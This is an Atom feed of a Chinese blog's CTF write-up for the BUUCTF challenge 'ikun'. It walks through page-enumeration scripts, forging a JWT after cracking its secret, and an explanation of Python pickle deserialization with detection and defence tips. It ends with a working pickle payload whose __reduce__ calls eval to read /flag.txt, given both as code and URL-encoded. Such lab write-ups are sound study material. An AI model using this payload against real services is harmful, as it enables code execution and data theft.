@@ -1,0 +1,162 @@
+<?xml version="1.0"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+    <id>http://odiws.github.io</id>
+    <title>Hexo • Posts by &#34;pickle反序列化&#34; tag</title>
+    <link href="http://odiws.github.io" />
+    <updated>2024-05-26T11:13:55.000Z</updated>
+    <category term="python" />
+    <category term="buuctf" />
+    <category term="ctf" />
+    <category term="http" />
+    <category term="php原生类利用" />
+    <category term="php反序列化" />
+    <category term="md5()和sha1()对类进行hash 触发__toString方法" />
+    <category term="mongodb注入" />
+    <category term="cms框架" />
+    <category term="条件竞争：利用session.upload_progress" />
+    <category term="preg_match绕过" />
+    <category term="$_server query_string 绕过" />
+    <category term="$_request绕过" />
+    <category term="file_get_cotents绕过" />
+    <category term="sha1函数比较数组绕过" />
+    <category term="create_function运用" />
+    <category term="json数据爬虫" />
+    <category term="regexp注入" />
+    <category term="js" />
+    <category term="ECB加密" />
+    <category term="buuctf， 反序列化" />
+    <category term="phar反序列化" />
+    <category term="thinkphpV6.0.0" />
+    <category term="php7 segment fault特性" />
+    <category term="pickle反序列化" />
+    <category term="buuctf， 伪随机数" />
+    <category term="CRLF Injection" />
+    <category term="soap" />
+    <category term="zip加密" />
+    <category term="system_file" />
+    <entry>
+        <id>http://odiws.github.io/2024/05/26/buuctf5%E6%9C%8826%E6%97%A5/</id>
+        <title>buuctf5月26日</title>
+        <link rel="alternate" href="http://odiws.github.io/2024/05/26/buuctf5%E6%9C%8826%E6%97%A5/"/>
+        <content type="html">&lt;h2 id=&#34;ciscn2019-华北赛区-day1-web2ikun&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#ciscn2019-华北赛区-day1-web2ikun&#34;&gt;#&lt;/a&gt; [CISCN2019 华北赛区 Day1 Web2] ikun&lt;/h2&gt;
+&lt;p&gt;&lt;img data-src=&#34;../images/buuctf5%E6%9C%8826%E6%97%A5/2.png&#34; alt=&#34;2&#34;&gt;&lt;/p&gt;
+&lt;h3 id=&#34;发现要先找到lv6&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#发现要先找到lv6&#34;&gt;#&lt;/a&gt; 发现要先找到 lv6&lt;/h3&gt;
+&lt;h4 id=&#34;找到lv6的脚本&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#找到lv6的脚本&#34;&gt;#&lt;/a&gt; 找到 lv6 的脚本：&lt;/h4&gt;
+&lt;pre&gt;&lt;code&gt;import requests
+url=&amp;quot;http://c0fe0b30-9fdd-41ce-b289-8d6630c49212.node5.buuoj.cn:81/shop?page=&amp;quot;
+
+for i in range(0,2000):
+    print(i)
+    r=requests.get( url + str(i) )
+    if &#39;lv6.png&#39; in r.text:
+        print (i)
+        break
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h4 id=&#34;更高级的&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#更高级的&#34;&gt;#&lt;/a&gt; 更高级的：&lt;/h4&gt;
+&lt;pre&gt;&lt;code&gt;import threading
+import time
+
+import requests
+
+
+def go(st, ed):
+    for i in range(st, ed):
+        url = &#39;http://c0fe0b30-9fdd-41ce-b289-8d6630c49212.node5.buuoj.cn:81/shop?page=&#39;
+        url += str(i)
+        r = requests.get(url, timeout=2)
+        if &#39;lv6.png&#39; in r.text:
+            print(r.url)
+        time.sleep(0.1)
+
+
+if __name__ == &#39;__main__&#39;:
+    threads = []
+    for i in range(0, 10):
+        t = threading.Thread(target=go, args=(i * 20, (i + 1) * 20))
+        threads.append(t)
+
+    for item in threads:
+        item.start()
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;找到在 181 的页面上：&lt;br&gt;
+&lt;img data-src=&#34;../images/buuctf5%E6%9C%8826%E6%97%A5/3.png&#34; alt=&#34;3&#34;&gt;&lt;/p&gt;
+&lt;p&gt;在进行购买，发现买不起，可以修改金额和折扣来买它，抓包后发现只能通过抓包来修改折扣，修改折扣后给你一个&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;../images/buuctf5%E6%9C%8826%E6%97%A5/4.png&#34; alt=&#34;4&#34;&gt;&lt;/p&gt;
+&lt;p&gt;可以发现有个 cookie，猜测是&lt;/p&gt;
+&lt;h4 id=&#34;jwt&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#jwt&#34;&gt;#&lt;/a&gt; jwt&lt;/h4&gt;
+&lt;p&gt;，直接复制 cookie，再&lt;/p&gt;
+&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9qd3QuaW8=&#34;&gt;https://jwt.io&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;用 c-jwt-cracker 爆破 jwt256-bit-secret&lt;/p&gt;
+&lt;p&gt;修改成 admin 将 jwt 换成该字符串，&lt;img data-src=&#34;../images/buuctf5%E6%9C%8826%E6%97%A5/5.png&#34; alt=&#34;5&#34;&gt;&lt;/p&gt;
+&lt;p&gt;登录这个网站 ctrl+u, 有个源码泄露&lt;img data-src=&#34;../images/buuctf5%E6%9C%8826%E6%97%A5/6.png&#34; alt=&#34;6&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;../images/buuctf5%E6%9C%8826%E6%97%A5/7.png&#34; alt=&#34;7&#34;&gt;&lt;/p&gt;
+&lt;h3 id=&#34;知识点pickle&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#知识点pickle&#34;&gt;#&lt;/a&gt; 知识点：pickle：&lt;/h3&gt;
+&lt;p&gt;提供了一个简单的持久化功能。可以将对象以文件的形式存放在磁盘上。&lt;/p&gt;
+&lt;p&gt;pickle 模块只能在 python 中使用，python 中几乎所有的数据类型（列表，字典，集合，类等）都可以用 pickle 来序列化，&lt;br&gt;
+pickle 序列化后的数据，可读性差，人一般无法识别。&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;p = pickle.loads(urllib.unquote(become))
+&lt;/code&gt;&lt;/pre&gt;
+&lt;pre&gt;&lt;code&gt;urllib.unquote:将存入的字典参数编码为URL查询字符串，即转换成以key1 = value1 &amp;amp; key2 = value2的形式pickle.loads(bytes_object): 从字节对象中读取被封装的对象，并返回我看了师傅们的博客之后的理解就是，我们构建一个类，类里面的__reduce__python魔术方法会在该类被反序列化的时候会被调用Pickle模块中最常用的函数为：
+&lt;/code&gt;&lt;/pre&gt;
+&lt;pre&gt;&lt;code&gt;pickle.dump(obj, file, [,protocol])
+函数的功能：将obj对象序列化存入已经打开的file中。
+参数讲解：
+obj：想要序列化的obj对象。
+file:文件名称。
+protocol：序列化使用的协议。如果该项省略，则默认为0。如果为负值或HIGHEST_PROTOCOL，则使用最高的协议版本。
+&lt;/code&gt;&lt;/pre&gt;
+&lt;pre&gt;&lt;code&gt;pickle.load(file)
+函数的功能：将file中的对象序列化读出。
+参数讲解：
+file：文件名称。
+&lt;/code&gt;&lt;/pre&gt;
+&lt;pre&gt;&lt;code&gt;pickle.loads(string)
+函数的功能：从string中读出序列化前的obj对象。
+参数讲解：
+string：文件名称。
+&lt;/code&gt;&lt;/pre&gt;
+&lt;pre&gt;&lt;code&gt;【注】 dump() 与 load() 相比 dumps() 和 loads() 还有另一种能力：dump()函数能一个接着一个地将几个对象序列化存储到同一个文件中，随后调用load()来以同样的顺序反序列化读出这些对象。而在__reduce__方法里面我们就进行读取flag.txt文件，并将该类序列化之后进行URL编码
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;检测反序列化方法：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;pickle.dumps(obj[, protocol])
+函数的功能：将obj对象序列化为string形式，而不是存入文件中。
+参数讲解：
+obj：想要序列化的obj对象。
+protocal：如果该项省略，则默认为0。如果为负值或HIGHEST_PROTOCOL，则使用最高的协议版本。
+&lt;/code&gt;&lt;/pre&gt;
+&lt;pre&gt;&lt;code&gt;pickle.loads(string)
+函数的功能：从string中读出序列化前的obj对象。
+参数讲解：
+string：文件名称。
+【注】 dump() 与 load() 相比 dumps() 和 loads() 还有另一种能力：dump()函数能一个接着一个地将几个对象序列化存储到同一个文件中，随后调用load()来以同样的顺序反序列化读出这些对象。而在__reduce__方法里面我们就进行读取flag.txt文件，并将该类序列化之后进行URL编码
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;检测反序列化方法：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;全局搜索Python代码中是否含有关键字类似“import cPickle”或“import pickle”等，若存在则进一步确认是否调用cPickle.loads()或pickle.loads()且反序列化的参数可控。
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;防御方法&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;1、用更高级的接口__getnewargs()、__getstate__()、__setstate__()等代替__reduce__()魔术方法；
+2、进行反序列化操作之前，进行严格的过滤，若采用的是pickle库可采用装饰器实现。
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;打洞&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;c__builtin__%0Aeval%0Ap0%0A%28S%22open%28%27/flag.txt%27%2C%27r%27%29.read%28%29%22%0Ap1%0Atp2%0ARp3%0A.
+&lt;/code&gt;&lt;/pre&gt;
+&lt;pre&gt;&lt;code&gt;import pickle
+import urllib
+
+class payload(object):
+    def __reduce__(self):
+       return (eval, (&amp;quot;open(&#39;/flag.txt&#39;,&#39;r&#39;).read()&amp;quot;,))
+
+a = pickle.dumps(payload())
+a = urllib.quote(a)
+print a
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;__&lt;/p&gt;
+&lt;p&gt;c__builtin__%0Aeval%0Ap0%0A%28S%22open%28%27/flag.txt%27%2C%27r%27%29.read%28%29%22%0Ap1%0Atp2%0ARp3%0A.&lt;/p&gt;
+</content>
+        <category term="buuctf" />
+        <category term="pickle反序列化" />
+        <updated>2024-05-26T11:13:55.000Z</updated>
+    </entry>
+</feed>
